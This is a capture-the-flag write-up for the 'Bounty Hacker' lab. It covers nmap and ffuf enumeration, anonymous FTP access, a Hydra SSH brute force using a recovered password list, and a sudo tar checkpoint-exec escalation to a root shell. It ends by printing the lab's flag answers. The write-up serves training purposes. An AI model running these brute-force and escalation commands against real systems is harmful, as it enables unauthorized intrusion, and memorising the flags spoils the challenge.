# Bounty Hacker Write-up

## 1. Reconnaissance

The first step in any penetration test or CTF challenge is **enumeration**. I began by scanning the target using **Nmap** to identify open ports and services.

```bash
nmap -sS -sV 10.128.183.158
```

### Results

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

### Analysis

Three services were discovered:

|Port|Service|Description|
|---|---|---|
|21|FTP|vsftpd 3.0.5|
|22|SSH|OpenSSH|
|80|HTTP|Apache Web Server|

This suggests three potential attack vectors:

- Anonymous **FTP access**
    
- **Web enumeration**
    
- Possible **SSH credential attack**
    

---

# 2. Web Enumeration

To discover hidden directories and files on the web server, I used **ffuf** with wordlists from SecLists.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.183.158/FUZZ
```

### Results

```
images
javascript
index.html
```

Some files like `.htaccess` and `.htpasswd` returned **403 Forbidden**, which indicates they exist but cannot be accessed.

### Conclusion

The web server did not reveal any useful vulnerabilities or sensitive files.

Therefore, I moved on to **FTP enumeration**.

---

# 3. FTP Enumeration

Since **port 21** was open, I attempted to connect to the FTP server.

```bash
ftp 10.128.183.158
```

The server returned:

```
530 This FTP server is anonymous only.
```

This indicates that **anonymous login is enabled**.

### Anonymous Login

```
Username: anonymous
Password: anonymous
```

Login succeeded.

---

# 4. FTP File Discovery

Listing the directory revealed two files:

```
locks.txt
task.txt
```

I downloaded them using:

```bash
get locks.txt
get task.txt
```

### Files Obtained

```
locks.txt
task.txt
```

---

# 5. File Analysis

### task.txt

This file appeared to contain a **message related to hacking activities** and referenced a user called **lin**.

This suggested that **lin may be a system user**.

---

### locks.txt

This file contained a **list of possible passwords**, such as:

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
### Interpretation

- The user is likely **lin**
    
- The file **locks.txt** contains potential **password candidates**
    

This suggests a **password attack against SSH**.

---

# 6. SSH Brute Force

Since **SSH is open on port 22**, I used **Hydra** to perform a password brute-force attack.

```bash
hydra -l lin -P locks.txt ssh://10.128.183.158
```

Eventually Hydra discovered valid credentials:

```
login: lin
password: RedDr4gonSynd1cat3
```

---

# 7. SSH Access

Using the discovered credentials, I logged into the machine.

```bash
ssh lin@10.128.183.158
```

After logging in, I was able to explore the system.

---

# 8. Privilege Escalation

The next step is to check for **sudo permissions**.

```bash
sudo -l
```

Result:

```
(ALL) NOPASSWD: /bin/tar
```

This can be exploited using techniques from **GTFOBins**.

Example escalation:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This results in a **root shell**.

---

# 9. Capture the Flags

After gaining root access, the flags can be retrieved.

Example locations:

```
/home/lin/user.txt => THM{CR1M3_SyNd1C4T3}
/root/root.txt => THM{80UN7Y_h4cK3r}
```

---

# Conclusion

This machine demonstrated several common penetration testing techniques:

- **Network enumeration with Nmap**  
- **Web directory brute forcing with ffuf**  
- **Anonymous FTP access exploitation**  
- **Password list discovery**  
- **SSH brute force attack**  
- **Privilege escalation using sudo misconfiguration**

---

# Tools Used

- Nmap
    
- FFUF
    
- FTP
    
- Hydra
    
- SSH
    
- Linux enumeration commands
    

---

Skills learned:

- Service enumeration
    
- Anonymous FTP exploitation
    
- Password brute forcing
    
- Privilege escalation